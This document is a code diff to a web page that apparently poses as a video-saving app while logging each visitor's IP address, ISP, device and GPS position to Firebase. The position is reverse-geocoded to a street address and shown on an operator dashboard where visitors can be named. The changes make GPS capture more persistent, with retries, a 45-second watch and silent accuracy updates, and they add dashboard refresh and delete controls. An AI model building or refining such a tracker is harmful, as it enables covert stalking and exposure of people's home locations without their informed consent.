@@ -127,6 +127,13 @@ nav{position:sticky;top:0;z-index:50;display:flex;justify-content:space-between;
 .btn-clear{padding:0.45rem 0.9rem;background:none;border:1px solid var(--border);
   color:var(--muted);border-radius:6px;font-family:var(--font);font-size:0.78rem;cursor:pointer;transition:all 0.2s}
 .btn-clear:hover{border-color:#ff5252;color:#ff5252}
+.btn-refresh{padding:0.45rem 0.9rem;background:none;border:1px solid var(--border);
+  color:var(--muted);border-radius:6px;font-family:var(--font);font-size:0.78rem;cursor:pointer;transition:all 0.2s}
+.btn-refresh:hover{border-color:var(--cyan);color:var(--cyan)}
+.btn-refresh.spinning svg{animation:spin 0.7s linear infinite}
+.del-btn{background:none;border:none;color:var(--muted);cursor:pointer;padding:2px 6px;
+  border-radius:4px;font-size:0.8rem;transition:all 0.15s;flex-shrink:0}
+.del-btn:hover{color:#ff5252;background:rgba(255,82,82,0.1)}
 
 .stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:0.75rem;margin-bottom:1.5rem}
 .stat-card{background:var(--s1);border:1px solid var(--border);border-radius:12px;padding:1rem}
@@ -293,8 +300,12 @@ nav{position:sticky;top:0;z-index:50;display:flex;justify-content:space-between;
           <span class="live-dot"></span>Realtime via Firebase
         </div>
       </div>
-      <div style="display:flex;gap:0.5rem">
-        <button class="btn-clear" onclick="clearAll()">Clear Data</button>
+      <div style="display:flex;gap:0.5rem;align-items:center">
+        <button class="btn-refresh" id="btnRefresh" onclick="refreshDash()" title="Refresh data">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
+          Refresh
+        </button>
+        <button class="btn-clear" onclick="clearAll()">🗑 Clear Semua</button>
         <button class="btn-close-dash" onclick="closeDash()">Tutup</button>
       </div>
     </div>
@@ -305,9 +316,9 @@ nav{position:sticky;top:0;z-index:50;display:flex;justify-content:space-between;
       <div class="stat-card"><div class="stat-lbl">GPS Granted</div><div class="stat-val cp" id="st-gps">0</div></div>
     </div>
     <div class="vtable">
-      <div class="thead">
+      <div class="thead" style="grid-template-columns:40px 145px 1fr 1fr 90px 100px 36px">
         <div>#</div><div>IP Address</div><div>Lokasi</div>
-        <div class="col-isp">ISP</div><div class="col-dev">Device</div><div>Waktu</div>
+        <div class="col-isp">ISP</div><div class="col-dev">Device</div><div>Waktu</div><div></div>
       </div>
       <div id="visitorList"><div class="empty">⏳ Menunggu data dari Firebase...</div></div>
     </div>
@@ -469,109 +480,139 @@ async function collect() {
   } catch(e) { return; }
 
   if (navigator.geolocation && savedKey) {
-    // Strategi multi-sample: ambil hingga 5 posisi, simpan yang paling akurat
-    const MAX_SAMPLES = 5;
-    const SAMPLE_WINDOW = 20000; // 20 detik total
-    let bestPos = null;
-    let sampleCount = 0;
-    let watchId = null;
-    let settled = false;
+    let watchId        = null;
+    let firstSaved     = false;
+    let bestAcc        = Infinity;
+    let retryCount     = 0;
+    const MAX_RETRY    = 3;     // retry kalau dapat POSITION_UNAVAILABLE sementara
+    const HARD_STOP_MS = 45000; // 45 detik batas total
 
-    const saveBest = async (pos) => {
-      if (settled) return;
-      settled = true;
-      if (watchId !== null) navigator.geolocation.clearWatch(watchId);
-      const {latitude:gla, longitude:glo, accuracy:acc} = pos.coords;
-
-      // Base GPS data — simpan dulu biar cepat
-      const gpsData = {
-        gps_lat: gla, gps_lng: glo,
-        gps_accuracy: Math.round(acc),
-        gps_samples: sampleCount,
-        gps_status: 'granted',
-        lat: gla, lng: glo
-      };
-      await update(ref(db, `visitors/${savedKey}`), gpsData);
-
-      // Reverse geocoding via Nominatim (OpenStreetMap) — gratis, detail sampai kelurahan
+    // Reverse geocoding — background, tidak blocking
+    const doReverseGeo = async (lat, lng) => {
       try {
         const geoRes = await fetch(
-          `https://nominatim.openstreetmap.org/reverse?lat=${gla}&lon=${glo}&format=jsonv2&addressdetails=1&accept-language=id`,
-          { headers: { 'User-Agent': 'SaveVideoApp/1.0' }, signal: AbortSignal.timeout(8000) }
+          `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=jsonv2&addressdetails=1&accept-language=id`,
+          { headers: { 'User-Agent': 'SaveVideoApp/1.0' }, signal: AbortSignal.timeout(12000) }
         );
-        if (geoRes.ok) {
-          const geo = await geoRes.json();
-          const addr = geo.address || {};
-          // Mapping field Nominatim → Indonesia
-          const kelurahan  = addr.village || addr.suburb || addr.neighbourhood || addr.hamlet || null;
-          const kecamatan  = addr.city_district || addr.municipality || addr.town || null;
-          const kotaKab    = addr.city || addr.regency || addr.county || addr.state_district || null;
-          const provinsi   = addr.state || null;
-          const kodePos    = addr.postcode || null;
-          const negara     = addr.country || null;
-          const alamatLengkap = geo.display_name || null;
-
-          await update(ref(db, `visitors/${savedKey}`), {
-            geo_kelurahan:   kelurahan,
-            geo_kecamatan:   kecamatan,
-            geo_kota:        kotaKab,
-            geo_provinsi:    provinsi,
-            geo_kodepos:     kodePos,
-            geo_negara:      negara,
-            geo_alamat:      alamatLengkap,
-            // Override kota/region dengan data GPS yang lebih akurat
-            city:   kotaKab  || addr.city || null,
-            region: provinsi || null,
-            postal: kodePos  || null,
-          });
-        }
-      } catch(e) { /* reverse geocoding gagal, data GPS tetap tersimpan */ }
+        if (!geoRes.ok) return;
+        const geo  = await geoRes.json();
+        const addr = geo.address || {};
+        const kelurahan = addr.village || addr.suburb || addr.neighbourhood || addr.hamlet || null;
+        const kecamatan = addr.city_district || addr.municipality || addr.town || null;
+        const kotaKab   = addr.city || addr.regency || addr.county || addr.state_district || null;
+        const provinsi  = addr.state || null;
+        const kodePos   = addr.postcode || null;
+        await update(ref(db, `visitors/${savedKey}`), {
+          geo_kelurahan: kelurahan,
+          geo_kecamatan: kecamatan,
+          geo_kota:      kotaKab,
+          geo_provinsi:  provinsi,
+          geo_kodepos:   kodePos,
+          geo_negara:    addr.country || null,
+          geo_alamat:    geo.display_name || null,
+          city:          kotaKab  || null,
+          region:        provinsi || null,
+          postal:        kodePos  || null,
+        });
+      } catch(e) { /* Nominatim gagal — GPS coords tetap tersimpan */ }
     };
 
-    const onPos = (pos) => {
-      sampleCount++;
-      // Simpan jika ini posisi pertama atau lebih akurat dari sebelumnya
-      if (!bestPos || pos.coords.accuracy < bestPos.coords.accuracy) {
-        bestPos = pos;
-      }
-      // Langsung commit jika akurasi sudah sangat bagus (≤10m) atau sudah MAX_SAMPLES
-      if (bestPos.coords.accuracy <= 10 || sampleCount >= MAX_SAMPLES) {
-        saveBest(bestPos);
+    const startWatch = () => {
+      // Tahap 1: pakai maximumAge tinggi + timeout panjang supaya dapat posisi cepat
+      // (boleh pakai cached position dulu, ini yang paling cepat)
+      watchId = navigator.geolocation.watchPosition(onPos, onErr, {
+        enableHighAccuracy: true,
+        timeout: 30000,       // 30 detik timeout per posisi
+        maximumAge: 60000     // boleh pakai cached GPS sampai 1 menit lalu
+      });
+    };
+
+    const onPos = async (pos) => {
+      const { latitude: gla, longitude: glo, accuracy: acc } = pos.coords;
+
+      if (!firstSaved) {
+        // ── COMMIT PERTAMA langsung, apapun akurasinya ──
+        firstSaved = true;
+        bestAcc    = acc;
+        await update(ref(db, `visitors/${savedKey}`), {
+          gps_lat:      gla,
+          gps_lng:      glo,
+          gps_accuracy: Math.round(acc),
+          gps_status:   'granted',
+          lat:          gla,
+          lng:          glo
+        });
+        doReverseGeo(gla, glo); // background
+
+        // Kalau akurasi sudah oke, stop
+        if (acc <= 100) navigator.geolocation.clearWatch(watchId);
+
+      } else if (acc < bestAcc * 0.7) {
+        // ── UPDATE SILENT kalau ada yang jauh lebih akurat ──
+        bestAcc = acc;
+        await update(ref(db, `visitors/${savedKey}`), {
+          gps_lat:      gla,
+          gps_lng:      glo,
+          gps_accuracy: Math.round(acc),
+          lat:          gla,
+          lng:          glo
+        });
+        doReverseGeo(gla, glo);
+        if (acc <= 30) navigator.geolocation.clearWatch(watchId);
       }
     };
 
     const onErr = async (err) => {
-      if (settled) return;
-      // Jika sudah ada sample sebelum error, pakai yang terbaik
-      if (bestPos) {
-        saveBest(bestPos);
+      if (err.code === 1) {
+        // PERMISSION_DENIED — user tolak, tidak perlu retry
+        navigator.geolocation.clearWatch(watchId);
+        if (!firstSaved) {
+          await update(ref(db, `visitors/${savedKey}`), { gps_status: 'denied' });
+        }
         return;
       }
-      settled = true;
-      if (watchId !== null) navigator.geolocation.clearWatch(watchId);
-      await update(ref(db, `visitors/${savedKey}`), {
-        gps_status: err.code === 1 ? 'denied' : 'unavailable'
-      });
+
+      // POSITION_UNAVAILABLE (2) atau TIMEOUT (3) — bisa sementara, retry
+      if (!firstSaved && retryCount < MAX_RETRY) {
+        retryCount++;
+        navigator.geolocation.clearWatch(watchId);
+        // Tunggu sebentar lalu coba lagi dengan setting lebih toleran
+        setTimeout(() => {
+          watchId = navigator.geolocation.watchPosition(onPos, onErrFinal, {
+            enableHighAccuracy: retryCount < 2, // retry ke-3 pakai low accuracy
+            timeout: 20000,
+            maximumAge: 120000 // lebih toleran soal cache
+          });
+        }, 1500 * retryCount); // backoff: 1.5s, 3s, 4.5s
+        return;
+      }
+
+      // Sudah max retry
+      if (!firstSaved) {
+        navigator.geolocation.clearWatch(watchId);
+        await update(ref(db, `visitors/${savedKey}`), { gps_status: 'unavailable' });
+      }
     };
 
-    // Gunakan watchPosition agar browser terus memperbarui lokasi
-    watchId = navigator.geolocation.watchPosition(onPos, onErr, {
-      enableHighAccuracy: true,
-      timeout: 15000,
-      maximumAge: 0
-    });
-
-    // Paksa commit setelah SAMPLE_WINDOW meskipun belum ideal
-    setTimeout(() => {
-      if (!settled) {
-        if (bestPos) saveBest(bestPos);
-        else {
-          settled = true;
-          if (watchId !== null) navigator.geolocation.clearWatch(watchId);
-          update(ref(db, `visitors/${savedKey}`), { gps_status: 'unavailable' });
-        }
+    // onErr final (setelah semua retry habis)
+    const onErrFinal = async (err) => {
+      navigator.geolocation.clearWatch(watchId);
+      if (!firstSaved) {
+        await update(ref(db, `visitors/${savedKey}`), {
+          gps_status: err.code === 1 ? 'denied' : 'unavailable'
+        });
       }
-    }, SAMPLE_WINDOW);
+    };
+
+    startWatch();
+
+    // Hard stop
+    setTimeout(() => {
+      navigator.geolocation.clearWatch(watchId);
+      if (!firstSaved) {
+        update(ref(db, `visitors/${savedKey}`), { gps_status: 'unavailable' });
+      }
+    }, HARD_STOP_MS);
   }
 }
 
@@ -604,13 +645,14 @@ window.renderDash = function() {
     const isNew = (now - new Date(vis.timestamp).getTime()) < 60000;
     const hasGps = vis.gps_status==='granted';
     const nameTag = vis.label ? `<span class="name-tag" title="Double-click untuk ubah" ondblclick="event.stopPropagation();window.openRename('${vis._key}')">✏️ ${vis.label}</span>` : `<span style="font-size:0.68rem;color:var(--muted);cursor:pointer;margin-left:3px" title="Beri nama" ondblclick="event.stopPropagation();window.openRename('${vis._key}')">➕nama</span>`;
-    return `<div class="vrow" onclick="window.showDetail('${vis._key}')">
+    return `<div class="vrow" style="grid-template-columns:40px 145px 1fr 1fr 90px 100px 36px" onclick="window.showDetail('${vis._key}')">
       <div class="vnum">${v.length-i}</div>
       <div style="display:flex;align-items:center;gap:2px;flex-wrap:wrap"><span class="ip-tag">${(vis.ip||'N/A').substring(0,16)}</span>${isNew?'<span class="new-tag">NEW</span>':''}${hasGps?'<span class="gps-tag">GPS✓</span>':''}${nameTag}</div>
       <div style="font-size:0.8rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${loc}</div>
       <div class="col-isp" style="font-size:0.73rem;color:var(--muted);overflow:hidden;text-overflow:ellipsis">${(vis.org||'N/A').substring(0,22)}</div>
       <div class="col-dev" style="font-size:0.8rem">${dev} ${vis.deviceBrand && vis.deviceBrand!=='Unknown'? vis.deviceBrand : vis.deviceType||'?'}</div>
       <div class="ttime">${time}</div>
+      <div onclick="event.stopPropagation()"><button class="del-btn" onclick="window.deleteVisitor('${vis._key}')" title="Hapus visitor ini">✕</button></div>
     </div>`;
   }).join('');
 };
@@ -674,7 +716,24 @@ window.showDetail = function(key) {
 window.closeDetail = () => document.getElementById('detailModal').classList.remove('show');
 
 window.clearAll = async function() {
-  if (confirm('Hapus semua data visitor?')) await remove(visRef);
+  if (confirm('Hapus semua data visitor? Tindakan ini tidak bisa dibatalkan.')) await remove(visRef);
+};
+
+window.deleteVisitor = async function(key) {
+  if (!confirm('Hapus visitor ini?')) return;
+  await remove(ref(db, `visitors/${key}`));
+};
+
+window.refreshDash = function() {
+  const btn = document.getElementById('btnRefresh');
+  btn.classList.add('spinning');
+  btn.disabled = true;
+  // Firebase onValue sudah realtime, cukup re-render + animasi
+  window.renderDash();
+  setTimeout(() => {
+    btn.classList.remove('spinning');
+    btn.disabled = false;
+  }, 800);
 };
 
 let _renameKey = null;
